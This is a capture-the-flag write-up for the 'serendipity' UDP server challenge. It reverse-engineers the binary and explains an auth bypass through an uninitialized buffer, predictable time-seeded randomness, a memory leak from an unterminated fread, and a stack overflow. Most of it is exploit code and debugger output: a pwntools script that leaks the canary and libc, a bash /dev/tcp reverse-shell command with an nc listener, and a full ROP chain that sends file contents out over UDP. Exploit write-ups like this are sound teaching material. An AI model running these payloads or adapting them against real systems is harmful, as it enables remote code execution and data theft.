0x1000ull, 0, addr, (socklen_t *)\u0026amp;addr[1].sa_family); the program requires the user to send data in a specific structure, which is outlined below.\nstruct data { unsigned int32 magic; unsigned int32 op_code; unsigned int16 size; char mess[4086]; } next, it checks the message received from the user, if it checks with each thread_id, the file of op_code is ignored and uses the first 8 bytes to compare with each thread_id.\nstruct session_data { unsigned int64 id; unsigned int16 size; char mess[4086]; } if it matches, it writes the message to the pipe write of the appropriate thread and continues the loop.\nfor ( j = 0; ; ++j ) { if ( j \u0026gt; 3 ) goto label_22; if ( *(_qword *)\u0026amp;buf-\u0026gt;magic == *((_qword *)\u0026amp;thread_id + 2 * j) ) break; } write(p0[2 * j + 1], buf, 0x1000ull); v4 = 1; label_22: if ( !v4 \u0026amp;\u0026amp; !(unsigned int)check_data(addr, v8, (__int64)buf) ) use_opcode((__int64)addr, (__int64)v8); otherwise, it will go to the check_data() function.\n__int64 __fastcall check_data(const struct sockaddr *a1, data *a2, data *a3) { int v3; // eax int v5; // eax a2-\u0026gt;magic = a3-\u0026gt;magic; if ( a2-\u0026gt;magic == 0x70303070 ) { a2-\u0026gt;opcode = a3-\u0026gt;opcode; a2-\u0026gt;size = a3-\u0026gt;size; if ( a2-\u0026gt;size \u0026lt;= 0xfffu ) { memcpy(a2-\u0026gt;mess, a3-\u0026gt;mess, (unsigned __int16)a2-\u0026gt;size); return 0ll; } else { memset(\u0026amp;a1[1].sa_data[2], 0, 0x200ull); strcpy(\u0026amp;a1[1].sa_data[2], \u0026#34;packet too large\\n\u0026#34;); v5 = strlen(\u0026amp;a1[1].sa_data[2]); send_to(a1, (__int64)\u0026amp;a1[1].sa_data[2], v5); return 1ll; } } else { memset(\u0026amp;a1[1].sa_data[2], 0, 0x200ull); strcpy(\u0026amp;a1[1].sa_data[2], \u0026#34;server magic mismatch\\n\u0026#34;); v3 = strlen(\u0026amp;a1[1].sa_data[2]); send_to(a1, (__int64)\u0026amp;a1[1].sa_data[2], v3); return 1ll; } } the program checks whether the magic field of the message is equal to 0x70303070 and if the size field is smaller than 4095. if both these conditions are true, the message is copied to use_opcode() function (which i will talk about later). if either of the conditions is false, the program returns 1 and goes back to the loop.\nvoid __fastcall use_opcode(const struct sockaddr *a1, data *a2) { unsigned int opcode; // eax int v3; // eax opcode = a2-\u0026gt;opcode; if ( opcode == 0x301 ) { print_data(a1, a2); } else { if ( opcode \u0026gt; 0x301 ) goto label_9; if ( opcode == 0x101 ) { generate_str(a1); return; } if ( opcode == 0x201 ) { authenticate(a1, a2); } else { label_9: memset(\u0026amp;a1[1].sa_data[2], 0, 0x200ull); strcpy(\u0026amp;a1[1].sa_data[2], \u0026#34;unknown opcode\\n\u0026#34;); v3 = strlen(\u0026amp;a1[1].sa_data[2]); send_to(a1, (__int64)\u0026amp;a1[1].sa_data[2], v3); } } } there are 3 op_code [0x301, 0x101, 0x201]. i will talk about those opcodes in turn.\n0x301 opcode\nunsigned __int64 __fastcall print_data(const struct sockaddr *a1, data *a2) { int s[2]; // [rsp+10h] [rbp-1020h] byref __int16 size; // [rsp+18h] [rbp-1018h] _byte v5[6]; // [rsp+1ah] [rbp-1016h] byref unsigned __int64 v6; // [rsp+1028h] [rbp-8h] v6 = __readfsqword(0x28u); memset(s, 0, 0x100cull); s[0] = a2-\u0026gt;magic; s[1] = a2-\u0026gt;opcode; memcpy(v5, a2-\u0026gt;mess, (unsigned __int16)a2-\u0026gt;size); size = a2-\u0026gt;size; memset(\u0026amp;a1[1].sa_data[2], 0, 0x200ull); memcpy(\u0026amp;a1[1].sa_data[2], s, (unsigned __int16)a2-\u0026gt;size + 10); send_to(a1, (__int64)\u0026amp;a1[1].sa_data[2], (unsigned __int16)a2-\u0026gt;size + 10); return v6 - __readfsqword(0x28u); } it simply sends the data that the user has been sending to the user. does it safely?\naddr = (struct sockaddr *)malloc(532ull); v8 = (data *)malloc(0x100cull); after examining the variable sockaddr *a1, which has a data field of 0x200 bytes, and the array data *a2, which has 0x1000c bytes of data, we noticed\u0026hellip;\nmemcpy(\u0026amp;a1[1].sa_data[2], s, (unsigned __int16)a2-\u0026gt;size + 10); when it uses memcpy to copy s to \u0026amp;a1[1].sa_data[2] with a size larger than 0x200 because a2 is below a1 struct in the heap mapping address, it causes a message of v5 overflow in the metadata field (magic, opcode, size) of a2, so i have the oob bug.\npwndbg\u0026gt; tel 100 00:0000│ rsp 0x7ffc4d8e0b30 —▸ 0x5584a5b415e0 ◂— 0x4141414141414141 (\u0026#39;aaaaaaaa\u0026#39;) // a2 01:0008│ 0x7ffc4d8e0b38 —▸ 0x5584a5b413c0 ◂— 0x100007faf910002 // a1 02:0010│ 0x7ffc4d8e0b40 ◂— 0x30170303070 03:0018│ 0x7ffc4d8e0b48 ◂— 0x4141414141410fff 04:0020│ 0x7ffc4d8e0b50 ◂— 0x4141414141414141 (\u0026#39;aaaaaaaa\u0026#39;) ... ↓ 95 skipped pwndbg\u0026gt; after repeatedly using the send_to loop to leak the size of 0x1000, it printed multiple data from the heap, including libc and heap addresses.\n► 0x56244a4b4a17 call sendto@plt \u0026lt;sendto@plt\u0026gt; fd: 0xb (socket:[133812]) buf: 0x56244bdc63d4 ◂— 0x30170303070 n: 0x1000 flags: 0x0 addr: 0x56244bdc63c0 ◂— 0x100007f1ad40002 addr_len: 0x10 0x56244a4b4a1c cmp rax, -1 0x56244a4b4a20 jne 0x56244a4b4a31 \u0026lt;0x56244a4b4a31\u0026gt; 0x56244a4b4a22 lea rax, [rip + 0x15fb] 0x56244a4b4a29 mov rdi, rax 0x56244a4b4a2c call error \u0026lt;error\u0026gt; ────────────────────────────────────────────────────────────────────────────────────────[ stack ]──────────────────────────────────────────────────────────────────────────────────────── 00:0000│ rsp 0x7ffd3980e4b0 ◂— 0x4 01:0008│ 0x7ffd3980e4b8 ◂— 0x414b00000001 02:0010│ 0x7ffd3980e4c0 —▸ 0x56244bdc63d4 ◂— 0x30170303070 03:0018│ 0x7ffd3980e4c8 —▸ 0x56244bdc63c0 ◂— 0x100007f1ad40002 04:0020│ 0x7ffd3980e4d0 ◂— 0x2158f0 05:0028│ 0x7ffd3980e4d8 ◂— 0x100000000000 06:0030│ rbp 0x7ffd3980e4e0 —▸ 0x7ffd3980f520 —▸ 0x7ffd3980f540 —▸ 0x7ffd3980f640 ◂— 0x1 07:0038│ 0x7ffd3980e4e8 —▸ 0x56244a4b5101 ◂— nop ──────────────────────────────────────────────────────────────────────────────────────[ backtrace ]────────────────────────────────────────────────────────────────────────────────────── ► 0 0x56244a4b4a17 1 0x56244a4b5101 2 0x56244a4b56ff 3 0x56244a4b5b78 4 0x7fc435a29d90 __libc_start_call_main+128 5 0x7fc435a29e40 __libc_start_main_impl+128 6 0x56244a4b45e5 ──────────────────────────────────────────────────────────────────────────────────[ threads (3 total) ]────────────────────────────────────────────────────────────────────────────────── ► 1 \u0026#34;serendipity_pat\u0026#34; stopped: 0x56244a4b4a17 2 \u0026#34;serendipity_pat\u0026#34; stopped: 0x7fc435ae57f8 \u0026lt;clock_nanosleep@glibc_2.2.5+200\u0026gt; 3 \u0026#34;serendipity_pat\u0026#34; stopped: 0x7fc435b14a0c \u0026lt;read+76\u0026gt; ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u0026gt; but, on the server, due to the i/o handle or somehow, i couldn\u0026rsquo;t manage to trigger that bug to leak any address. so we should find another way to leak\nopcode 0x101\nunsigned __int64 __fastcall generate_str(const struct sockaddr *a1) { __int64 v1; // rdx __int64 v2; // rdx unsigned int v3; // eax int v5; // [rsp+14h] [rbp-ach] char *rand; // [rsp+18h] [rbp-a8h] void *v7; // [rsp+20h] [rbp-a0h] void *v8; // [rsp+28h] [rbp-98h] char s[136]; // [rsp+30h] [rbp-90h] byref unsigned __int64 v10; // [rsp+b8h] [rbp-8h] v10 = __readfsqword(0x28u); rand = generate_rand(32); v1 = *((_qword *)rand + 1); *(_qword *)s1 = *(_qword *)rand; qword_6148 = v1; v2 = *((_qword *)rand + 3); qword_6150 = *((_qword *)rand + 2); qword_6158 = v2; v7 = calloc(1ull, 0x10ull); v8 = calloc(1ull, 0x10ull); memset(s, 0, 0x80ull); key_iv((__int64)v7, (__int64)v8); v3 = strlen(rand); v5 = encrypt((__int64)s1, v3, (__int64)v7, (__int64)v8, (__int64)s); send_to(a1, (__int64)s, v5); return v10 - __readfsqword(0x28u); } this code generates an array of 32 random bytes using srand(time(0)), making it predictable\n_byte *__fastcall sub_293b(int a1) { unsigned int v1; // eax int i; // [rsp+14h] [rbp-ch] _byte *v4; // [rsp+18h] [rbp-8h] v1 = time(0ll); srand(v1); v4 = calloc(1ull, a1 + 1); for ( i = 0; i \u0026lt; a1; ++i ) { do v4[i] = rand(); while ( !v4[i] ); } return v4; } continue, it copies the key and iv from the file user_config to encrypt with previous random data.\nopcode 0x201\nvoid __fastcall authenticate(const struct sockaddr *a1, data *a2) { int v2; // eax int v3; // eax int v4; // eax int i; // [rsp+14h] [rbp-ch] if ( !strncmp(s1, (const char *)a2-\u0026gt;mess, 32ull) ) { memset(\u0026amp;a1[1].sa_data[2], 0, 0x200ull); strcpy(\u0026amp;a1[1].sa_data[2], \u0026#34;auth successfully\\n\u0026#34;); v3 = strlen(\u0026amp;a1[1].sa_data[2]); send_to(a1, (__int64)\u0026amp;a1[1].sa_data[2], v3); for ( i = 0; i \u0026lt;= 3; ++i ) { if ( !*((_qword *)\u0026amp;thread_id + 2 * i) ) { *((_qword *)\u0026amp;thread_id + 2 * i) = *(_qword *)generate_rand(8); thread[2 * i] = time(0ll) + 60; memset(\u0026amp;a1[1].sa_data[2], 0, 0x200ull); strncpy(\u0026amp;a1[1].sa_data[2], (const char *)\u0026amp;thread_id + 16 * i, 8ull); send_to(a1, (__int64)\u0026amp;a1[1].sa_data[2], 8); create_new_thread((__int64)a1, (__int64)a2, i); return; } } memset(\u0026amp;a1[1].sa_data[2], 0, 0x200ull); strcpy(\u0026amp;a1[1].sa_data[2], \u0026#34;only 4 sessions at a time\\n\u0026#34;); v4 = strlen(\u0026amp;a1[1].sa_data[2]); send_to(a1, (__int64)\u0026amp;a1[1].sa_data[2], v4); } else { memset(\u0026amp;a1[1].sa_data[2], 0, 0x200ull); strcpy(\u0026amp;a1[1].sa_data[2], \u0026#34;auth failed\\n\u0026#34;); v2 = strlen(\u0026amp;a1[1].sa_data[2]); send_to(a1, (__int64)\u0026amp;a1[1].sa_data[2], v2); } } it compares the encrypted data from the opcode 0x101 function with the global variable s1.\ni can use the trick i learned from the first challenge to predict the data, but it\u0026rsquo;s not necessary because s1 is initialized when i use opcode 0x101. so basically, if i don\u0026rsquo;t initialize it, the s1 variable remains uninitialized and i can bypass it with a null byte.\nif the authentication process is successful, a session id is generated and stored in the global variable thread_id. it is then sent to the user. following this, a new thread is created using the start_routine() function with the struct address and data passed in as two arguments for the thread.\nint __fastcall create_new_thread(__int64 a1, __int64 a2, int a3) { _dword *arg; // [rsp+28h] [rbp-8h] arg = calloc(1ull, 0x10ull); *(_qword *)arg = a1; arg[2] = a3; return pthread_create(\u0026amp;qword_60e0[a3], 0ll, (void *(*)(void *))start_routine, arg); } start_routine\nvoid *__fastcall start_routine(_dword *a1) { int v1; // eax int v3; // eax size_t v4; // rax int v5; // eax int v6; // eax int v7; // [rsp+1ch] [rbp-344h] const struct sockaddr *v8; // [rsp+20h] [rbp-340h] read_file *buf; // [rsp+28h] [rbp-338h] file *stream; // [rsp+30h] [rbp-330h] __int64 s; // [rsp+40h] [rbp-320h] byref int type; // [rsp+48h] [rbp-318h] unsigned __int16 size; // [rsp+4ch] [rbp-314h] _byte v14[258]; // [rsp+4eh] [rbp-312h] byref char dest[8]; // [rsp+150h] [rbp-210h] byref __int64 v16; // [rsp+158h] [rbp-208h] byref char ptr[264]; // [rsp+250h] [rbp-110h] byref unsigned __int64 v18; // [rsp+358h] [rbp-8h] v18 = __readfsqword(0x28u); v8 = *(const struct sockaddr **)a1; v7 = a1[2]; buf = (read_file *)calloc(1ull, 0x1000ull); while ( 1 ) { while ( 1 ) { memset(\u0026amp;s, 0, 0x110ull); memset(dest, 0, 0x100ull); memset(ptr, 0, 0x100ull); read(p0[2 * v7], buf, 0x1000ull); s = buf-\u0026gt;session; type = buf-\u0026gt;type; size = buf-\u0026gt;size; memcpy(v14, buf-\u0026gt;file_name, size); memcpy(dest, \u0026#34;./files/\u0026#34;, sizeof(dest)); memcpy(\u0026amp;v16, v14, 0xf0ull); if ( strstr(dest, \u0026#34;..\u0026#34;) ) { memset(\u0026amp;v8[1].sa_data[2], 0, 0x200ull); strcpy(\u0026amp;v8[1].sa_data[2], \u0026#34;invalid file\\n\u0026#34;); v1 = strlen(\u0026amp;v8[1].sa_data[2]); send_to(v8, (__int64)\u0026amp;v8[1].sa_data[2], v1); return 0ll; } if ( !type ) break; if ( type == 1 ) { memset(\u0026amp;v8[1].sa_data[2], 0, 0x200ull); strcpy(\u0026amp;v8[1].sa_data[2], \u0026#34;under construction\\n\u0026#34;); v6 = strlen(\u0026amp;v8[1].sa_data[2]); send_to(v8, (__int64)\u0026amp;v8[1].sa_data[2], v6); } } stream = fopen(dest, \u0026#34;r\u0026#34;); if ( !stream ) break; fread(ptr, 0x100ull, 1ull, stream); memset(\u0026amp;v8[1].sa_data[2], 0, 0x200ull); v4 = strlen(ptr); strncpy(\u0026amp;v8[1].sa_data[2], ptr, v4); v5 = strlen(\u0026amp;v8[1].sa_data[2]); send_to(v8, (__int64)\u0026amp;v8[1].sa_data[2], v5); fclose(stream); } memset(\u0026amp;v8[1].sa_data[2], 0, 0x200ull); strcpy(\u0026amp;v8[1].sa_data[2], \u0026#34;file can\u0026#39;t be read\\n\u0026#34;); v3 = strlen(\u0026amp;v8[1].sa_data[2]); send_to(v8, (__int64)\u0026amp;v8[1].sa_data[2], v3); return 0ll; } it\u0026rsquo;s read data from the pipe read of the current session. you may notice that in the main function, it has checked if the first 8 bytes match with the session id, it will perform to write in the pipe_write of this thread. so, i can easily manage communication between them.\nread primitive ╭─    ~/ctf/pwnable/2023/wc2023/serendipity    master !1 ?38   ✔  w1n_gl0ry@phis1ng ─╮ ╰─ ls files ─╯ dance_of_the_petals echoes_of_dawn lullaby_of_the_rain moonlit_embrace whispers_of_serenity basically, the function take the message as the argument to perform read in this file we choose.\nstruct read_file { char session[8]; unsigned int32 type; unsigned int16 size; char file_name[4082]; } notice that the file_name field we have manage up to 4082 bytes and the size file up to 0xfff bytes.\nmemset(\u0026amp;s, 0, 0x110ull); memset(dest, 0, 0x100ull); memset(ptr, 0, 0x100ull); read(p0[2 * v7], buf, 0x1000ull); s = buf-\u0026gt;session; type = buf-\u0026gt;type; size = buf-\u0026gt;size; memcpy(v14, buf-\u0026gt;file_name, size); memcpy(dest, \u0026#34;./files/\u0026#34;, sizeof(dest)); however, the v14 has only 258 bytes, so we can easily perform overflow.\nfread(ptr, 0x100ull, 1ull, stream); memset(\u0026amp;v8[1].sa_data[2], 0, 0x200ull); v4 = strlen(ptr); strncpy(\u0026amp;v8[1].sa_data[2], ptr, v4); v5 = strlen(\u0026amp;v8[1].sa_data[2]); send_to(v8, (__int64)\u0026amp;v8[1].sa_data[2], v5); fclose(stream); the fread() function does not add a null byte at the end of a string, which means that we can make the v4 variable larger than the capacity of the ptr variable. this creates a powerful read primitive that allows for easy setup to leak the canary and libc address.\nfrom pwn import * if args.local: io=process(\u0026#39;./serendipity_patched\u0026#39;) if args.gdb: cmd=\u0026#34;\u0026#34;\u0026#34; init-pwndbg brva 0x0000000000002fd7 \u0026#34;\u0026#34;\u0026#34; gdb.attach(io, cmd) else: io=remote(\u0026#39;157.245.147.89\u0026#39;, 25201, typ=\u0026#34;udp\u0026#34;) elf=context.binary=elf(\u0026#39;./serendipity_patched\u0026#39;) libc=elf(\u0026#39;./libc.so.6\u0026#39;) io.interactive() i use this code to easily debug and connect with a server using nc -u 0 9981 on my local machine.\nfrom pwn import * from ctypes import * import socket from time import sleep import sys libc=elf(\u0026#39;./libc.so.6\u0026#39;) glibc = cdll.loadlibrary(\u0026#39;libc.so.6\u0026#39;) #io=remote(\u0026#39;157.245.147.89\u0026#39;, 24210, typ=\u0026#34;udp\u0026#34;) io=remote(\u0026#39;0\u0026#39;, 9981, typ=\u0026#39;udp\u0026#39;) opcode=[0x301, 0x101, 0x201] def printdata(size, data): pl=p32(0x70303070) pl+=p32(opcode[0]) pl+=p16(size) pl+=data io.send(pl) plain=b\u0026#39;\u0026#39; session=b\u0026#39;\u0026#39; def genarate_rand_string(size=0, data=0): global plain pl=p32(0x70303070) pl+=p32(opcode[1]) pl+=p16(size) pl+=b\u0026#39;a\u0026#39;*100 io.send(pl) glibc.srand(glibc.time(none)) for i in range(32): plain+=p8(glibc.rand() \u0026amp; 0xff) print(plain.hex()) data= io.recv() return data def authenticate(size=0): global session pl=p32(0x70303070) pl+=p32(opcode[2]) pl+=p16(0x100) pl+=plain io.send(pl) data= io.recv() session=io.recv() print(data) return session genarate_rand_string() a=authenticate() print(a) pause() printdata(0xfff, b\u0026#39;a\u0026#39;*0xfff) print(io.recv()) data=io.recv(0x1000) heap=u64(data[4:10].ljust(8, b\u0026#39;\\0\u0026#39;)) - 0x4ba0 print(hex(heap)) this code attempts to execute a heap leak using opcode 0x301, but unfortunately it fails in the server\nwe have to leak canary and libc via opcode 0x101\nsession=a buf=session buf+=p32(0) buf+=p16(0x30a+1) buf+=b\u0026#39;moonlit_embrace\\0\u0026#39; buf+=(778+1-len(b\u0026#39;moonlit_embrace\\0\u0026#39;))*b\u0026#39;a\u0026#39; io.send(buf) data = io.recv() leak=u64(b\u0026#39;\\0\u0026#39;+data[265:]) log.info(\u0026#34;canary: \u0026#34; + hex(leak)) session=a buf=session buf+=p32(0) buf+=p16(0x30a+1+7+8) buf+=b\u0026#39;moonlit_embrace\\0\u0026#39; buf+=(778+8-len(b\u0026#39;moonlit_embrace\u0026#39;))*b\u0026#39;a\u0026#39; buf+=data[265:] buf+=b\u0026#39;a\u0026#39;*8 io.send(buf) data = io.recv() libc.address=u64(data[264+8+8:].ljust(8, b\u0026#39;\\0\u0026#39;)) - 0x94ac3 log.info(\u0026#34;libc.address: \u0026#34; + hex(libc.address)) here is result:\n╭─    ~/ctf/pwnable/2023/wc2023/serendipity    master !1 ?38   1 ✘  w1n_gl0ry@phis1ng ─╮ ╰─ python3 remote.py ─╯ [*] \u0026#39;/home/w1n_gl0ry/ctf/pwnable/2023/wc2023/serendipity/libc.so.6\u0026#39; arch: amd64-64-little relro: partial relro stack: canary found nx: nx enabled pie: pie enabled [+] opening connection to 0 on port 9981: done 85026bdce60e5a253187b0a061854c0269225675b70fcadd25c7353058ffb4dd b\u0026#39;auth successfully\\n\u0026#39; [*] canary: 0x89f7373a66e1cd00 [*] libc.address: 0x7f4413600000 [*] switching to interactive mode $ we have successfully leaked. how can we get the shell through the udp connection?\ni use this method to execute a reverse shell:\nlisten on a port 1337: ╭─    ~/ctf/pwnable/2023/wc2023/serendipity    master !1 ?38   ✔  w1n_gl0ry@phis1ng ─╮ ╰─ nc -lnvp 1337 ─╯ listening on 0.0.0.0 1337 i use the system function in my rop to execute a command. system(\u0026#39;bash -c \\\u0026#39;exec bash -i \u0026amp;\u0026gt;/dev/tcp/0/1337 \u0026lt;\u0026amp;1\\\u0026#39;\u0026#39;) result:\n╭─    ~/ctf/pwnable/2023/wc2023/serendipity    master !1 ?38   ✔  w1n_gl0ry@phis1ng ─╮ ╰─ nc -lnvp 1337 ─╯ listening on 0.0.0.0 1337 connection received on 127.0.0.1 34014 w1n_gl0ry@phis1ng:~/ctf/pwnable/2023/wc2023/serendipity$ w1n_gl0ry@phis1ng:~/ctf/pwnable/2023/wc2023/serendipity$ id id uid=1000(w1n_gl0ry) gid=1000(w1n_gl0ry) groups=1000(w1n_gl0ry),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),118(lpadmin) we successfully achieved rce using reverse shell. however, the docker blocked external network access, preventing us from obtaining a shell.\nfinal phase during the contest, i considered an alternative approach: simply performing an open-read-write to obtain the flag. the author also hinted at the flag\u0026rsquo;s location: /home/user/flag. but can we obtain the flag by writing to stdout?\nno, we need to come up with a different approach to send the flag over the udp connection. so, i will use an open-read-sendto chain to get the flag\nso what parameters does the sendto syscall need?\nssize_t sendto(int sockfd, const void *buf, size_t len, int flags, const struct sockaddr *dest_addr, socklen_t addrlen); fortunately, the r8 register points to our sockaddr struct before executing our rop chain.\nrax 0x0 rbx 0x7f744c1fe640 ◂— 0x7f744c1fe640 rcx 0x7f744cb27c56 (sendto+118) ◂— cmp rax, -0x1000 /* \u0026#39;h=\u0026#39; */ *rdx 0x0 rdi 0x0 rsi 0x560df594a3d4 ◂— \u0026#34;file can\u0026#39;t be read\\n\u0026#34; r8 0x560df594a3c0 ◂— 0x100007fa8d10002 // our sockaddr struct r9 0x10 r10 0x0 r11 0x293 r12 0x7f744c1fe640 ◂— 0x7f744c1fe640 r13 0x0 r14 0x7f744ca947d0 (start_thread) ◂— endbr64 r15 0x7ffed7952e20 ◂— 0x0 rbp 0x7f744c1fde50 ◂— 0x4141414141414141 (\u0026#39;aaaaaaaa\u0026#39;) rsp 0x7f744c1fdaf0 ◂— 0x0 *rip 0x560df4890e70 ◂— je 0x560df4890e77 *eflags 0x246 [ cf pf af zf sf if df of ] ──────────────────────────────────────────────────────────────────────────[ disasm / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────── 0x560df4890d19 call 0x560df48909b9 \u0026lt;0x560df48909b9\u0026gt; 0x560df4890d1e mov eax, 0 0x560df4890d23 jmp 0x560df4890e63 \u0026lt;0x560df4890e63\u0026gt; ↓ 0x560df4890e63 mov rdx, qword ptr [rbp - 8] 0x560df4890e67 sub rdx, qword ptr fs:[0x28] ► 0x560df4890e70 ✔ je 0x560df4890e77 \u0026lt;0x560df4890e77\u0026gt; ↓ 0x560df4890e77 leave 0x560df4890e78 ret ↓ 0x7f744ca2a3e5 \u0026lt;iconv+197\u0026gt; pop rdi 0x7f744ca2a3e6 \u0026lt;iconv+198\u0026gt; ret ↓ 0x7f744ca796a2 \u0026lt;printf_positional+5666\u0026gt; pop rdx ────────────────────────────────────────────────────────────────────────────────────────[ stack ]──────────────────────────────────────────────────────────────────────────────────────── 00:0000│ rsp 0x7f744c1fdaf0 ◂— 0x0 01:0008│ 0x7f744c1fdaf8 —▸ 0x560df598b360 —▸ 0x560df594a3c0 ◂— 0x100007fa8d10002 02:0010│ 0x7f744c1fdb00 ◂— 0x0 03:0018│ 0x7f744c1fdb08 ◂— 0x0 04:0020│ 0x7f744c1fdb10 —▸ 0x560df594a3c0 ◂— 0x100007fa8d10002 05:0028│ 0x7f744c1fdb18 —▸ 0x7f7444000b70 ◂— 0xc7ccaec0fbfe94bc 06:0030│ 0x7f744c1fdb20 ◂— 0x0 07:0038│ 0x7f744c1fdb28 ◂— 0x0 ──────────────────────────────────────────────────────────────────────────────────────[ backtrace ]────────────────────────────────────────────────────────────────────────────────────── ► 0 0x560df4890e70 1 0x7f744ca2a3e5 iconv+197 2 0x7f744ca796a2 printf_positional+5666 3 0x7f744ca796a2 printf_positional+5666 4 0x7f744ca796a2 printf_positional+5666 ──────────────────────────────────────────────────────────────────────────────────[ threads (3 total) ]────────────────────────────────────────────────────────────────────────────────── ► 3 \u0026#34;serendipity_pat\u0026#34; stopped: 0x560df4890e70 1 \u0026#34;serendipity_pat\u0026#34; stopped: 0x7f744cb1b82d \u0026lt;select+349\u0026gt; 2 \u0026#34;serendipity_pat\u0026#34; stopped: 0x7f744cae57f8 \u0026lt;clock_nanosleep@glibc_2.2.5+200\u0026gt; ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u0026gt; we finally assigned the respective arguments.\n► 0x7f744cb4101b \u0026lt;__netlink_close+11\u0026gt; syscall \u0026lt;sys_sendto\u0026gt; fd: 0xb (socket:[153083]) buf: 0x7f744cc1a8c8 (buffer) ◂— \u0026#39;server_flag\\n\u0026#39; n: 0xc flags: 0x0 addr: 0x560df594a3c0 ◂— 0x100007fa8d10002 addr_len: 0x10 0x7f744cb4101d \u0026lt;__netlink_close+13\u0026gt; ret result:\n╭─    ~/ctf/pwnable/2023/wc2023/serendipity    master !1 ?38   1 ✘  w1n_gl0ry@phis1ng ─╮ ╰─ python3 remote.py ─╯ [*] \u0026#39;/home/w1n_gl0ry/ctf/pwnable/2023/wc2023/serendipity/libc.so.6\u0026#39; arch: amd64-64-little relro: partial relro stack: canary found nx: nx enabled pie: pie enabled [+] opening connection to 0 on port 9981: done bc94fefbc0aeccc762678d353d911917c32ce5266a0df70afd4bef072fb147ec b\u0026#39;auth successfully\\n\u0026#39; [*] canary: 0x63648f5a8f209500 [*] libc.address: 0x7f744ca00000 [*] paused (press any to continue) b\u0026#34;in the moon\u0026#39;s tender embrace, shadows waltz in a silvery dance, weaving dreams with a gentle trance.\\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u0026#34; [*] switching to interactive mode file can\u0026#39;t be read server_flag $ exploit script solve.py\nfrom pwn import * from ctypes import * import socket from time import sleep import sys libc=elf(\u0026#39;./libc.so.6\u0026#39;) glibc = cdll.loadlibrary(\u0026#39;libc.so.6\u0026#39;) #io=remote(\u0026#39;157.245.147.89\u0026#39;, 24210, typ=\u0026#34;udp\u0026#34;) io=remote(\u0026#39;0\u0026#39;, 9981, typ=\u0026#39;udp\u0026#39;) opcode=[0x301, 0x101, 0x201] def printdata(size, data): pl=p32(0x70303070) pl+=p32(opcode[0]) pl+=p16(size) pl+=data io.send(pl) plain=b\u0026#39;\u0026#39; session=b\u0026#39;\u0026#39; def genarate_rand_string(size=0, data=0): global plain pl=p32(0x70303070) pl+=p32(opcode[1]) pl+=p16(size) pl+=b\u0026#39;a\u0026#39;*100 io.send(pl) glibc.srand(glibc.time(none)) for i in range(32): plain+=p8(glibc.rand() \u0026amp; 0xff) print(plain.hex()) data= io.recv() return data def authenticate(size=0): global session pl=p32(0x70303070) pl+=p32(opcode[2]) pl+=p16(0x100) pl+=plain io.send(pl) data= io.recv() session=io.recv() print(data) return session genarate_rand_string() a=authenticate() # print(a) # pause() # printdata(0xfff, b\u0026#39;a\u0026#39;*0xfff) # print(io.recv()) # data=io.recv(0x1000) # heap=u64(data[4:10].ljust(8, b\u0026#39;\\0\u0026#39;)) - 0x4ba0 # print(hex(heap)) session=a buf=session buf+=p32(0) buf+=p16(0x30a+1) buf+=b\u0026#39;moonlit_embrace\\0\u0026#39; buf+=(778+1-len(b\u0026#39;moonlit_embrace\\0\u0026#39;))*b\u0026#39;a\u0026#39; io.send(buf) data = io.recv() leak=u64(b\u0026#39;\\0\u0026#39;+data[265:]) log.info(\u0026#34;canary: \u0026#34; + hex(leak)) session=a buf=session buf+=p32(0) buf+=p16(0x30a+1+7+8) buf+=b\u0026#39;moonlit_embrace\\0\u0026#39; buf+=(778+8-len(b\u0026#39;moonlit_embrace\u0026#39;))*b\u0026#39;a\u0026#39; buf+=data[265:] buf+=b\u0026#39;a\u0026#39;*8 io.send(buf) data = io.recv() libc.address=u64(data[264+8+8:].ljust(8, b\u0026#39;\\0\u0026#39;)) - 0x94ac3 log.info(\u0026#34;libc.address: \u0026#34; + hex(libc.address)) pop_rax=0x0000000000045eb0+libc.address bin_sh=libc.address+next(libc.search(b\u0026#39;/bin/sh\\0\u0026#39;)) pop_rdi=libc.address+0x000000000002a3e5 pop_rsi=libc.address+0x000000000002be51 pop_rdx=libc.address+0x00000000000796a2 mov_rdi_rdx=libc.address+0x0000000000149709 mov_r8_rbx=0x0000000000121f8a+libc.address pop_rcx_rbx=libc.address+0x0000000000108b04 ret=pop_rdi+1 xchg_edi_eax=0x000000000009198d+libc.address mov_rax_r8=0x000000000011db23+libc.address syscall=0x14101b+libc.address pl=b\u0026#39;\u0026#39; pl+=p64(pop_rdi) pl+=p64(libc.bss(40)) pl+=p64(pop_rdx) pl+=p64(8319607999311079471) pl+=p64(mov_rdi_rdx) pl+=p64(pop_rdi) pl+=p64(libc.bss(40)+8) pl+=p64(pop_rdx) pl+=p64(29099040799945317) pl+=p64(mov_rdi_rdx) pl+=p64(pop_rdi) pl+=p64(libc.bss(40)+16) pl+=p64(pop_rdx) pl+=p64(0) pl+=p64(mov_rdi_rdx) pl+=p64(pop_rsi) pl+=p64(0) pl+=p64(pop_rdx) pl+=p64(0) pl+=p64(pop_rdi) pl+=p64(libc.bss(40)) pl+=p64(pop_rax) pl+=p64(2) pl+=p64(syscall) pl+=p64(xchg_edi_eax) pl+=p64(pop_rsi) pl+=p64(libc.bss(40)) pl+=p64(pop_rdx) pl+=p64(0x100) pl+=p64(pop_rax) pl+=p64(0) pl+=p64(syscall) pl+=p64(pop_rcx_rbx) pl+=p64(0) pl+=p64(0) pl+=p64(pop_rdi) pl+=p64(0xb) pl+=p64(pop_rdx) pl+=p64(12) pl+=p64(pop_rax) pl+=p64(44) pl+=p64(syscall) session=a buf=session buf+=p32(0) buf+=p16(0x500) buf+=b\u0026#39;moonlit_embrace\\0\u0026#39; buf+=(778-len(b\u0026#39;moonlit_embrace\\0\u0026#39;))*b\u0026#39;a\u0026#39; buf+=p64(leak) buf+=b\u0026#39;a\u0026#39;*8 buf+=pl io.send(buf) pause() session=a buf=session buf+=p32(0) buf+=p16(0x100) buf+=b\u0026#39;moonlit_embraceaaa\u0026#39; io.send(buf) data = io.recv() print(data) 